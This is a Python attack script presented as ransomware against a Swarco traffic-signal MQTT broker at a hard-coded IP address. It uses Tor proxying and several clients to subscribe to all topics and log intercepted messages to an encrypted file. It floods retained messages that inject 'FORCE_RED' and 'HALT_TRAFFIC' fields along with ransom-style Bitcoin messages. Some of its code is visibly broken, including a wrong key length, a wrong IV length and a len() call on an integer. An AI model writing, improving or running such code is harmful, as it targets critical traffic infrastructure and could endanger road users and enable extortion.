#!/usr/bin/env python3
# MIL_RANSOMWARE_v2.5-TOTAL_DOMINATION | TRUSTEDF57 | BROKER FLOOD

import paho.mqtt.client as mqtt
import json, time, threading, base64, os, socket, random
import socks
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

class SWARCORansomware:
    def __init__(self):
        self.target_ip = "166.159.129.5"
        self.port = 1883
        self.op_name = "TRUSTEDF57"
        self.btc_addr = "fucknomoneySUCCHIALO"
        
        self.aes_key = b'TRUSTEDF57_SWARCO_MIL_K3Y_32BYT3S!!'
        self.iv = b'SWARCO_SEMAFORI_16'
        
        socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
        socket.socket = socks.socksocket
        
        # MULTI CLIENT ATTACK
        self.clients = []
        for i in range(5):  # 5 client paralleli
            client = mqtt.Client(
                client_id=f"TRUSTEDF57_DOM{i}", 
                clean_session=False,
                callback_api_version=mqtt.CallbackAPIVersion.VERSION1
            )
            client.on_connect = lambda c, u, f, rc, p=None: self.multi_connect(c)
            self.clients.append(client)
        
        self.domination_active = True
        self.total_dom = False
    
    def aes_encrypt_all(self, data):
        cipher = Cipher(algorithms.AES(self.aes_key), modes.CBC(self.iv), backend=default_backend())
        encryptor = cipher.encryptor()
        padded = data.encode() + b' ' * (16 - len(data.encode()) % 16)
        return base64.b64encode(encryptor.update(padded) + encryptor.finalize()).decode()
    
    def total_domination(self):
        """💣 TOTAL DOMINATION - FLOOD AES"""
        if self.total_dom:
            return
        self.total_dom = True
        print("💣 TOTAL DOMINATION - AES FLOOD!")
        
        aes_payload = self.aes_encrypt_all(f"TRUSTEDF57_{self.btc_addr}_{self.aes_key.hex()}")
        
        for client in self.clients:
            for topic in ["traffic-triggers-output", "traffic-statistic-output/#", "#"]:
                for _ in range(50):  # 50x per topic
                    client.publish(topic, aes_payload, qos=2, retain=True)
        print("💣 250+ AES MESSAGES RETAINED!")
    
    def perfect_swarco_payload(self):
        """🎯 PERFECT SWARCO JSON + FORCE_RED"""
        timestamp = time.strftime("%Y-%m-%dT%H:%M:%S+00:00")
        payload = {
            "timestamp": timestamp,
            "TRUSTEDF57": "DOMINATION",
            "trigger_outputs": []
        }
        
        # ESATTA struttura Swarco + i nostri campi
        lanes = [
            ("lane1", "sensor1", "zoneA", "trigger_1_0", 32),
            ("lane2", "sensor1", "zoneB", "trigger_2_1", 33),
            ("lane3", "sensor1", "zoneC", "trigger_3_2", 34),
            ("lane10", "sensor2", "zoneK", "trigger_11_8", 40),
            ("lane15", "sensor3", "zoneO", "trigger_15_11", 44),
            ("lane16", "sensor3", "zoneP", "trigger_16_12", 45)
        ]
        
        for lane, sensor, zone, ref, output in lanes:
            payload["trigger_outputs"].append({
                "traffic_triggers": [{
                    "associated_lane": lane,
                    "associated_sensor": sensor,
                    "associated_zone": zone,
                    "reference_name": ref,
                    "FORCE_RED": True,      # ← INIETTO
                    "TRUSTEDF57": True,     # ← INIETTO
                    "HALT_TRAFFIC": True    # ← INIETTO
                }],
                "trigger_output": output
            })
        
        return json.dumps(payload)
    
    def domination_spam(self):
        """5 client spam parallelo"""
        payloads = [
            self.perfect_swarco_payload(),
            json.dumps({"☢️": "TRUSTEDF57_DOMINATION", "BTC": self.btc_addr}),
            json.dumps({"STATUS": "HALTED", "OP": "TRUSTEDF57"}),
        ]
        
        for client in self.clients:
            topic = random.choice(["traffic-triggers-output", "traffic-statistic-output/sensor1"])
            payload = random.choice(payloads)
            client.publish(topic, payload, qos=2, retain=True)
    
    def multi_connect(self, client):
        print(f"✅ CLIENT {client._client_id} CONNECTED")
        client.subscribe("#", qos=2)
    
    def on_message(self, client, userdata, msg, properties=None):
        data = msg.payload.decode(errors='ignore')
        print(f"[DOM] {msg.topic}: {data[:40]}...")
        
        enc_loot = self.aes_encrypt_all(f"{msg.topic}|{data}")
        with open("swarco_dom.aes", "ab") as f:
            f.write(f"{enc_loot}\n".encode())
        
        # Trigger domination dopo loot
        if len(os.path.getsize("swarco_dom.aes")) > 10000:
            self.total_domination()
    
    def domination_loop(self):
        while self.domination_active:
            self.domination_spam()
            time.sleep(0.1)  # 10Hz total domination
    
    def run(self):
        print("💣 TRUSTEDF57 v2.5-TOTAL_DOMINATION | 5 CLIENTS FLOOD")
        
        # Avvia tutti i client
        for client in self.clients:
            client.on_message = self.on_message
            threading.Thread(target=lambda c=client: c.connect(self.target_ip, self.port, 30), daemon=True).start()
        
        threading.Thread(target=self.domination_loop, daemon=True).start()
        time.sleep(5)
        self.total_domination()  # Force dopo 5s
        
        while True:
            time.sleep(1)

if __name__ == "__main__":
    rw = SWARCORansomware()
    rw.run()
